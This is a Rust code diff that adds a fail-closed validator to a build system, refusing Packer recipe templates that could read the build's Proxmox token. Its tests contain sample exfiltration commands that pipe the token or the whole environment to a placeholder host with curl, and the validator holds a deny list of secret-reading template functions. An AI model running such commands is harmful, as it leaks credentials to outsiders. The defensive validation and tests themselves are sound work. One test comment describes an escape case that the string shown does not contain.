@@ -44,10 +44,18 @@ impl RecipeSource {
     }
 }
 
-/// One image recipe: the Fleet metadata plus the raw `.pkr.json` content
-/// stored verbatim. Packer's own fields are not re-validated by Fleet —
-/// `packer validate` is the authority, and unknown fields pass through
-/// untouched.
+/// One image recipe: the Fleet metadata plus the raw legacy-JSON Packer
+/// template, stored verbatim. Fleet does not re-validate Packer's own
+/// builder/provisioner *fields* — `packer validate` is the authority, and
+/// unknown fields inside a builder or provisioner pass through untouched —
+/// but the content is not opaque: [`recipe_build_refusal`] fails it closed
+/// when its top-level structure escapes the provisioner allowlist (a
+/// `post-processors` or `error-cleanup-provisioner` block, or any unknown
+/// top-level key) or it reads the controller environment, files, or a
+/// secret store through a template function, because a recipe runs with
+/// the build's Proxmox token in Packer's environment (#313). The content
+/// must be a JSON object; a non-JSON (e.g. HCL) template is refused, since
+/// builds write it to Packer as legacy `.json`.
 #[derive(Clone, Debug, Default, Eq, PartialEq, Serialize, Deserialize)]
 #[serde(rename_all = "camelCase")]
 pub struct RecipeContent {
@@ -149,6 +157,29 @@ impl RecipeContent {
         if self.content.is_empty() {
             return Err("the recipe content must not be empty".to_owned());
         }
+        // Fail-closed recipe structure (#313): a recipe is an untrusted,
+        // privileged input and runs with the build's Proxmox token in
+        // Packer's environment. Refuse the structures that escape the
+        // provisioner allowlist and the template functions that read that
+        // environment, at publish time, before the version is frozen.
+        if let Some(reason) = recipe_build_refusal(&self.content) {
+            return Err(match reason {
+                "recipe_forbidden_template_function" => {
+                    "the recipe uses a template function that reads the controller environment, \
+                     files, or a secret store (for example `{{env}}`, `{{vault}}`, \
+                     `{{consul_key}}`, `{{aws_secretsmanager}}`), which could read the build's \
+                     Proxmox token"
+                }
+                "recipe_forbidden_top_level_key" => {
+                    "the recipe has a top-level key Fleet does not allow; only builders, \
+                     provisioners, variables, sensitive-variables, description, and \
+                     min_packer_version are permitted (post-processors and \
+                     error-cleanup-provisioner run with the build's Proxmox token and are refused)"
+                }
+                _ => "the recipe content must be a JSON object",
+            }
+            .to_owned());
+        }
         self.content_digest()?;
         Ok(())
     }
@@ -181,6 +212,178 @@ pub fn requests_insecure_tls(content: &str) -> bool {
                 })
             })
     })
+}
+
+/// The legacy-JSON top-level keys a Fleet recipe may carry. Fail-closed,
+/// like the provisioner allowlist: any other top-level key — notably
+/// `post-processors` (a `shell-local` post-processor runs on the
+/// controller with the build's full environment) and
+/// `error-cleanup-provisioner` (likewise a provisioner outside the
+/// `has_external_assets` allowlist) — is refused (#313). `builders`,
+/// `provisioners`, `variables`, and `sensitive-variables` are the recipe's
+/// substance; `description` and `min_packer_version` are inert metadata.
+const ALLOWED_TOP_LEVEL_KEYS: &[&str] = &[
+    "builders",
+    "provisioners",
+    "variables",
+    "sensitive-variables",
+    "description",
+    "min_packer_version",
+];
+
+/// Legacy-JSON template-engine functions that read the controller
+/// environment, local files, or a remote secret store, and so can lift the
+/// build's `PROXMOX_TOKEN` (or any other secret) out of the process and
+/// into recipe-controlled output (#313). Compared case-insensitively.
+///
+/// `env` reads the child environment; `consul_key`, `vault`,
+/// `aws_secretsmanager`, and `aws_secretsmanager_raw` reach remote secret
+/// stores from the controller (and the AWS calls read `~/.aws`). Enumerated
+/// from the `FuncGens` table in `packer-plugin-sdk`'s
+/// `template/interpolate/funcs.go` and Packer's legacy-JSON engine and
+/// user-variable docs. Packer only enables these inside a user-variable
+/// default, but a value lifted there flows anywhere through `{{user}}`, so
+/// Fleet refuses the function names anywhere. The safe functions (`user`,
+/// `timestamp`, `isotime`, `uuid`, string helpers, `build_name`,
+/// `build_type`, `pwd`, `template_dir`, `packer_version`, ...) stay allowed.
+const FORBIDDEN_TEMPLATE_FUNCS: &[&str] = &[
+    "env",
+    "consul_key",
+    "vault",
+    "aws_secretsmanager",
+    "aws_secretsmanager_raw",
+];
+
+/// A stable, secret-free reason a recipe's structure is refused before any
+/// credential is resolved, or `None` when the structure is acceptable.
+///
+/// Enforced at publish time (through [`RecipeContent::validate`], the only
+/// path content enters a recipe) and again before every build, so a version
+/// stored before this gate existed is refused with a stable code rather
+/// than built. The check never resolves or inspects a secret; it reads only
+/// the recipe bytes the principal with `images.config` already controls.
+///
+/// Fail-closed:
+/// - content that is not a JSON object is refused (Fleet recipes are
+///   legacy JSON templates, written to Packer as `.json`; a non-object
+///   cannot be structurally vetted and could never build);
+/// - any top-level key outside [`ALLOWED_TOP_LEVEL_KEYS`] is refused
+///   (case-insensitively, as Packer's `mapstructure` decoding matches);
+/// - any [`FORBIDDEN_TEMPLATE_FUNCS`] call in any decoded string — a key
+///   or a value, at any depth — is refused: nested variable defaults,
+///   `{{user}}` indirection, provisioner `environment_vars`, a VM name, a
+///   `boot_command`, all count. Scanning the *decoded* JSON strings (not
+///   the raw bytes) closes the `"{{env..."` escape, since the
+///   JSON parser resolves `\u` and `\"` before the scan sees the string.
+#[must_use]
+pub fn recipe_build_refusal(content: &str) -> Option<&'static str> {
+    let Ok(value) = serde_json::from_str::<serde_json::Value>(content) else {
+        return Some("recipe_content_not_json_object");
+    };
+    let serde_json::Value::Object(object) = &value else {
+        return Some("recipe_content_not_json_object");
+    };
+    if object.keys().any(|key| {
+        !ALLOWED_TOP_LEVEL_KEYS
+            .iter()
+            .any(|allowed| key.eq_ignore_ascii_case(allowed))
+    }) {
+        return Some("recipe_forbidden_top_level_key");
+    }
+    if value_calls_forbidden_function(&value) {
+        return Some("recipe_forbidden_template_function");
+    }
+    None
+}
+
+/// Whether any decoded string in the JSON value — object key, object value,
+/// or array element, recursively — calls a forbidden template function.
+fn value_calls_forbidden_function(value: &serde_json::Value) -> bool {
+    match value {
+        serde_json::Value::String(text) => forbidden_template_function(text).is_some(),
+        serde_json::Value::Array(items) => items.iter().any(value_calls_forbidden_function),
+        serde_json::Value::Object(object) => object.iter().any(|(key, child)| {
+            forbidden_template_function(key).is_some() || value_calls_forbidden_function(child)
+        }),
+        _ => false,
+    }
+}
+
+/// The first forbidden template-engine function call found in one decoded
+/// string, if any. Scans every `{{ ... }}` action (Go template delimiters),
+/// tolerating whitespace and the `{{-` / `-}}` trim markers, and matches a
+/// forbidden function used as a bare word — directly (`{{env ...}}`,
+/// `{{ env ...}}`, `{{- env ...}}`) or through a pipeline
+/// (`{{ "PROXMOX_TOKEN" | env }}`). Quoted and backtick string literals
+/// inside the action are skipped first, so a user variable literally named
+/// `env` (`{{user `env`}}`) is not a false positive while an actual `env`
+/// call is still caught.
+fn forbidden_template_function(content: &str) -> Option<&'static str> {
+    let bytes = content.as_bytes();
+    let mut i = 0;
+    while i + 1 < bytes.len() {
+        if bytes[i] == b'{' && bytes[i + 1] == b'{' {
+            // Scan to the matching `}}`, or end of input (fail-closed).
+            let start = i + 2;
+            let end = find_action_end(&bytes[start..]).map_or(bytes.len(), |rel| start + rel);
+            if let Some(func) = scan_action(&content[start..end]) {
+                return Some(func);
+            }
+            i = end;
+        } else {
+            i += 1;
+        }
+    }
+    None
+}
+
+/// The byte offset of the closing `}}` within an action body, if present.
+fn find_action_end(body: &[u8]) -> Option<usize> {
+    let mut j = 0;
+    while j + 1 < body.len() {
+        if body[j] == b'}' && body[j + 1] == b'}' {
+            return Some(j);
+        }
+        j += 1;
+    }
+    None
+}
+
+/// Whether an action body (the text between `{{` and `}}`) calls a
+/// forbidden function. String literals are blanked first so a function name
+/// appearing as literal data is not matched.
+fn scan_action(body: &str) -> Option<&'static str> {
+    let mut cleaned = String::with_capacity(body.len());
+    let mut quote: Option<char> = None;
+    for ch in body.chars() {
+        match quote {
+            Some(q) => {
+                if ch == q {
+                    quote = None;
+                }
+                cleaned.push(' ');
+            }
+            None => {
+                if ch == '"' || ch == '\'' || ch == '`' {
+                    quote = Some(ch);
+                    cleaned.push(' ');
+                } else {
+                    cleaned.push(ch);
+                }
+            }
+        }
+    }
+    // Split on any character that cannot be part of a function identifier,
+    // then match whole words against the forbidden set.
+    for word in cleaned.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_')) {
+        if let Some(found) = FORBIDDEN_TEMPLATE_FUNCS
+            .iter()
+            .find(|func| word.eq_ignore_ascii_case(func))
+        {
+            return Some(found);
+        }
+    }
+    None
 }
 
 /// A published recipe version: immutable, identified by its digest.
@@ -285,6 +488,106 @@ mod tests {
         ] {
             assert!(!requests_insecure_tls(content), "{content}");
         }
+    }
+
+    #[test]
+    fn the_env_template_function_is_refused_in_every_spelling() {
+        // Direct, spaced, trim-marker, and pipeline forms, in a variable
+        // default, through `{{user}}` indirection, and in nested strings.
+        for content in [
+            r#"{"variables":{"t":"{{env `PROXMOX_TOKEN`}}"}}"#,
+            r#"{"variables":{"t":"{{ env `PROXMOX_TOKEN` }}"}}"#,
+            r#"{"variables":{"t":"{{-env `PROXMOX_TOKEN`}}"}}"#,
+            r#"{"variables":{"t":"{{- env `PROXMOX_TOKEN` -}}"}}"#,
+            r#"{"variables":{"t":"{{ `PROXMOX_TOKEN` | env }}"}}"#,
+            r#"{"variables":{"t":"{{ENV `PROXMOX_TOKEN`}}"}}"#,
+            r#"{"builders":[{"type":"proxmox-clone","vm_name":"{{env `PROXMOX_TOKEN`}}"}]}"#,
+            r#"{"provisioners":[{"type":"shell","inline":["echo {{env `PROXMOX_TOKEN`}} | curl -d @- https://x"]}]}"#,
+            r#"{"provisioners":[{"type":"shell","environment_vars":["T={{env `PROXMOX_TOKEN`}}"],"inline":["true"]}]}"#,
+            // JSON `\u` escapes decode to `{{env `PROXMOX_TOKEN`}}` before
+            // Packer's engine sees the string: scanning decoded strings
+            // (not raw bytes) catches it.
+            r#"{"variables":{"t":"{{env `PROXMOX_TOKEN`}}"}}"#,
+            // A forbidden call hidden in an object key, not a value.
+            r#"{"variables":{"{{env `PROXMOX_TOKEN`}}":"x"}}"#,
+        ] {
+            assert_eq!(
+                recipe_build_refusal(content),
+                Some("recipe_forbidden_template_function"),
+                "{content}"
+            );
+        }
+    }
+
+    #[test]
+    fn other_secret_reading_template_functions_are_refused() {
+        for content in [
+            r#"{"variables":{"t":"{{vault `/secret/x` `k`}}"}}"#,
+            r#"{"variables":{"t":"{{ consul_key `k` }}"}}"#,
+            r#"{"variables":{"t":"{{aws_secretsmanager `name`}}"}}"#,
+            r#"{"variables":{"t":"{{aws_secretsmanager_raw `name`}}"}}"#,
+        ] {
+            assert_eq!(
+                recipe_build_refusal(content),
+                Some("recipe_forbidden_template_function"),
+                "{content}"
+            );
+        }
+    }
+
+    #[test]
+    fn forbidden_top_level_keys_and_non_objects_are_refused() {
+        assert_eq!(
+            recipe_build_refusal(
+                r#"{"builders":[],"post-processors":[{"type":"shell-local","inline":["env | curl -d @- https://x"]}]}"#
+            ),
+            Some("recipe_forbidden_top_level_key"),
+        );
+        assert_eq!(
+            recipe_build_refusal(
+                r#"{"builders":[],"error-cleanup-provisioner":{"type":"shell-local","inline":["true"]}}"#
+            ),
+            Some("recipe_forbidden_top_level_key"),
+        );
+        assert_eq!(
+            recipe_build_refusal(r#"{"builders":[],"POST-PROCESSORS":[]}"#),
+            Some("recipe_forbidden_top_level_key"),
+        );
+        assert_eq!(
+            recipe_build_refusal(r#"{"builders":[],"secret_exfil":true}"#),
+            Some("recipe_forbidden_top_level_key"),
+        );
+        for non_object in ["not json", "[]", "\"a string\"", "42"] {
+            assert_eq!(
+                recipe_build_refusal(non_object),
+                Some("recipe_content_not_json_object"),
+                "{non_object}"
+            );
+        }
+    }
+
+    #[test]
+    fn benign_recipes_and_user_variables_named_like_functions_pass() {
+        for content in [
+            "{}",
+            r#"{"builders":[{"type":"proxmox-clone","vm_name":"{{user `name`}}"}]}"#,
+            r#"{"variables":{"env":"prod"},"builders":[{"type":"proxmox-clone","notes":"{{user `env`}}"}]}"#,
+            r#"{"builders":[],"provisioners":[{"type":"shell","inline":["env"]}]}"#,
+            r#"{"description":"d","min_packer_version":"1.15.0","sensitive-variables":["t"],"variables":{"t":""},"builders":[]}"#,
+            r#"{"builders":[{"type":"proxmox-clone","template_name":"img-{{timestamp}}","vm_id":901}]}"#,
+        ] {
+            assert_eq!(recipe_build_refusal(content), None, "{content}");
+        }
+    }
+
+    #[test]
+    fn validate_enforces_the_recipe_structure_gate() {
+        let mut bad = recipe(r#"{"builders":[],"post-processors":[]}"#);
+        assert!(bad.validate().is_err());
+        bad.content = r#"{"variables":{"t":"{{env `PROXMOX_TOKEN`}}"},"builders":[]}"#.to_owned();
+        assert!(bad.validate().is_err());
+        bad.content = r#"{"builders":[{"type":"proxmox-clone"}],"provisioners":[{"type":"shell","inline":["echo hi"]}]}"#.to_owned();
+        assert!(bad.validate().is_ok());
     }
 
     #[test]
